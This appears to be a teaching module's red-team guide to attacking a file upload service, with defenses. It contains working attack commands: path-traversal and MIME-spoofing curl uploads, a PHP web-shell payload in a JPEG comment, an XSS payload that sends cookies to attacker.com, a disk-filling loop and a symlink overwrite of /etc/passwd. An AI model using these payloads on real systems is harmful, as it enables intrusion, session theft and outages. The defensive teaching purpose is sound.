# M06 File Uploader: Red Team

## Attack 1: Path Traversal

### Objective
Overwrite critical server files by escaping the upload directory.

### Method
Upload a file with a malicious filename:

```bash
curl -F "image=@shell.js;filename=../../../app/server.js" \
     https://api.example.com/upload
```

### Expected Result
The file is written to `/app/server.js`, overwriting your application entry point. On next restart, your server runs attacker code.

### The Vulnerable Code
```javascript
cb(null, file.originalname);
```

### Defense
- Generate filenames with `crypto.randomUUID()`.
- Strip all path separators.
- Resolve the final path and verify it starts with the upload directory.

---

## Attack 2: MIME Type Spoofing

### Objective
Upload an executable file disguised as an image.

### Method
Rename `malware.exe` to `photo.jpg` and set the browser's `Content-Type` to `image/jpeg`:

```bash
curl -F "image=@malware.exe;filename=photo.jpg;type=image/jpeg" \
     https://api.example.com/upload
```

### Expected Result
Server accepts the file because it trusts the MIME type. If the server later runs `exec()` on uploaded files (e.g., for virus scanning), the malware executes.

### The Vulnerable Code
```javascript
if (file.mimetype !== 'image/jpeg') reject();
```

### Defense
Validate magic numbers. Use `sharp` or `file-type` to parse the actual file content.

---

## Attack 3: The Polyglot Image

### Objective
Create a file that is simultaneously a valid image AND a valid PHP script.

### Method
Embed PHP code inside a JPEG comment block:

```bash
# Create a valid JPEG
convert -size 100x100 xc:blue valid.jpg

# Embed PHP payload in EXIF comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' valid.jpg

# Rename to .php.jpg
cp valid.jpg shell.php.jpg
```

Some servers parse `.php.jpg` as PHP if the regex is `.*\.php.*`.

### Expected Result
Visiting `/uploads/shell.php.jpg?cmd=whoami` executes `whoami` on the server.

### Defense
- Never execute files from the upload directory.
- Serve uploads with `Content-Disposition: attachment`.
- Use a separate domain for user content.

---

## Attack 4: The Zip Bomb

### Objective
Exhaust server resources by uploading a tiny file that expands to a massive size.

### Method
Create a 42 KB ZIP file that decompresses to 4.5 PB (the "42.zip" bomb):

```bash
# Or simply: zip bomb.zip bomb.txt
# where bomb.txt is a file of repeated null bytes compressed 1000:1
```

Upload `bomb.zip` to an endpoint that auto-extracts archives.

### Expected Result
Server CPU and disk are consumed by decompression. Service becomes unresponsive.

### Defense
- Do not auto-extract archives from untrusted sources.
- If extraction is required, limit output size and depth:
  ```javascript
  const MAX_DECOMPRESSED_SIZE = 100 * 1024 * 1024; // 100 MB
  ```
- Scan ZIP headers for suspicious compression ratios before extracting.

---

## Attack 5: The XSS Upload

### Objective
Execute JavaScript in victims' browsers by uploading an HTML file.

### Method
Upload an HTML file with an embedded script:

```html
<!-- saved as cute-cat-photo.html -->
<img src="x" onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
```

### Expected Result
When another user visits `https://api.example.com/uploads/cute-cat-photo.html`, the script runs in the context of `api.example.com`, stealing their session cookies.

### Defense
- Serve user-generated content from a separate domain (`usercontent.example.com`).
- Set `X-Content-Type-Options: nosniff`.
- Set `Content-Security-Policy: default-src 'none'`.
- Never allow `.html` uploads unless absolutely necessary.

---

## Attack 6: The Denial of Storage

### Objective
Exhaust server disk space by uploading infinite files.

### Method
```bash
while true; do
  dd if=/dev/zero bs=1M count=5 | curl -F "image=@-;filename=big.jpg" https://api.example.com/upload
done
```

5 MB per request, infinite loop. Disk fills in hours.

### Defense
- Per-user upload quotas.
- Global disk usage monitoring with alerts.
- Automatic cleanup of unconfirmed uploads.
- Rate limiting on the upload endpoint itself.

---

## Attack 7: The Symlink Race

### Objective
Overwrite arbitrary files using a TOCTOU (time-of-check to time-of-use) race condition.

### Method
1. Upload a symlink: `ln -s /etc/passwd payload.jpg`
2. Server checks `payload.jpg` — it is a small file, passes validation.
3. Between check and move, attacker swaps the symlink target to a real file.
4. Server moves the file, following the symlink, overwriting `/etc/passwd`.

### Defense
- Use `fs.rename()` (atomic) rather than copy-then-delete.
- Check `fs.lstat()` to ensure the file is not a symlink.
- Write to a temp directory, then atomically move to the final location.

---

## Red Team Mindset

> File upload is a trust boundary. On one side: your server, your data, your reputation. On the other: an attacker who can send any sequence of bytes with any metadata attached. The boundary is porous by default. Your job is to make it a wall — not by trusting, but by verifying, sanitizing, and isolating at every step.

The attacker only needs one gap. You need to close them all.
